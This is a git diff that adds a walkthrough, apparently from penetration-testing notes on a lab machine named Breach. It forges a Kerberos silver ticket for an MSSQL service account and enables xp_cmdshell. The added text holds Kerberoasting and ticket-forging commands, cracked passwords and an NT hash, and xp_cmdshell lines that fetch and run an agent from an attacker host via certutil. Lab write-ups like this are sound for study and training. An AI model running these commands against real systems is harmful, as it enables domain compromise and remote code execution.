@@ -144,3 +144,75 @@ Nagoya example:
 ./chisel server --port 8080 --reverse
 .\chisel.exe client 192.168.45.240:8080 R:1433:127.0.0.1:1433
 ```
+
+### Port-qualified MSSQL SPN example
+
+Breach first recovered `Julia.Wong:Computer1` from a captured NetNTLMv2 response. Authenticated LDAP enumeration supplied the domain SID and a Kerberoastable `svc_mssql` account:
+
+```bash
+nxc ldap breach.vl -u julia.wong -p 'Computer1' --users --groups --computers --dc-list --get-sid --admin-count --asreproast asrep.txt --kerberoasting kerberoast.txt
+```
+
+Cracking the `svc_mssql` TGS recovered `Trustno1`. A direct SQL login opened as `guest`, and `is_srvrolemember('sysadmin')` returned `0`:
+
+```bash
+impacket-mssqlclient breach.vl/svc_mssql:Trustno1@breachdc -windows-auth
+```
+
+Query the service account's SPN before forging the ticket. The observed SPN included port `1433`:
+
+```bash
+impacket-GetUserSPNs -dc-ip 10.129.72.224 breach.vl/julia.wong
+```
+
+```text
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql
+```
+
+Using the NT hash of `Trustno1` and the enumerated domain SID, forge the ticket for that exact SPN:
+
+```bash
+impacket-ticketer -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn 'MSSQLSvc/breachdc.breach.vl:1433' Administrator
+```
+
+The Breach Kerberos config disabled hostname canonicalization:
+
+```ini
+[libdefaults]
+    default_realm = BREACH.VL
+    dns_canonicalize_hostname = false
+    rdns = false
+
+[domain_realm]
+    .breach.vl = BREACH.VL
+    breach.vl = BREACH.VL
+```
+
+With that config saved as `/tmp/krb5-no-canon.conf`, use the ticket against the host and port in the SPN:
+
+```bash
+export KRB5_CONFIG=/tmp/krb5-no-canon.conf
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient breach.vl/Administrator@breachdc.breach.vl:1433 -target-ip 10.129.72.224 -windows-auth -k -no-pass
+```
+
+The SQL session opened as `BREACH\Administrator` in `dbo@master`. The role check returned `1`, after which `xp_cmdshell` was enabled. `whoami /all` showed the command ran as `breach\svc_mssql` with `SeImpersonatePrivilege` enabled:
+
+```text
+SELECT is_srvrolemember('sysadmin');
+enable_xp_cmdshell
+xp_cmdshell "whoami /all"
+```
+
+The SQL command runner downloaded and started the agent used to stage the later service payload:
+
+```bash
+python3 -m http.server
+```
+
+```text
+xp_cmdshell "certutil -urlcache -f http://10.10.14.51:8000/apollo.exe C:\Windows\TEMP\apollo.exe"
+xp_cmdshell "cmd.exe /c start /b C:\Windows\TEMP\apollo.exe"
+```
+
+The enabled privilege led to the [GodPotato service payload](../windows-priv-esc/windows-privilege-abuse.md#godpotato-service-payload). Its output showed a SYSTEM token, successful service creation, and the service starting.
